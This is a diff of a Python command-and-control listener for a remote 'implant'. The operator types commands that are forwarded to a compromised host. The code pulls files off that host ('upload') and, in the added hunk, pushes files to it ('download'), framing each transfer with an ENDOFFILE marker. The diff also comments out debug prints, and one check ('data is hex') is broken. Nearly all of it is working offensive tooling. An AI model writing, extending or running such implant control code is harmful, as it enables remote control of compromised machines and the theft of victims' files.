@@ -2,14 +2,13 @@ import socket
 import threading
 import time
 
-#threadPool = {}
 
-ip,port = '127.0.0.1',4001
+ip,port = '127.0.0.1', 4001
 
 with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
-    s.bind((ip,port))
+    s.bind((ip, port))
     s.listen()
-    conn,addr = s.accept()
+    conn, addr = s.accept()
     with conn:
         data = conn.recv(1024).decode()
         if data is hex:
@@ -19,13 +18,12 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
             cmd = input("Send command to implant: ")
             if cmd.split()[0] == 'upload':
                 with open('retrieved_'+ cmd.split()[1], 'wb') as f:
-                    print('file opened')
+                    # print('file opened')
                     conn.send(cmd.encode())
                     while True:
-                        print('receiving data...')
+                        # print('receiving data...')
                         data = conn.recv(8192)
-                        print(data)
-                        #print('data=%s', (data))
+                        # print(data)
                         if not data or data == b'':
                             break
                         if data.__contains__(b'ENDOFFILE'):
@@ -33,6 +31,17 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
                             f.write(data)
                             break
                         f.write(data)
+            elif cmd.split()[0] == "download":
+                conn.send(cmd.encode())
+                file = open(cmd.split()[1], "rb")
+                data = file.read()
+                while data:
+                    conn.send(data)
+                    data = file.read(8192)
+                    if not data:
+                        break
+                file.close()
+                conn.send("ENDOFFILE".encode())
 
             else:
                 conn.send(cmd.encode())
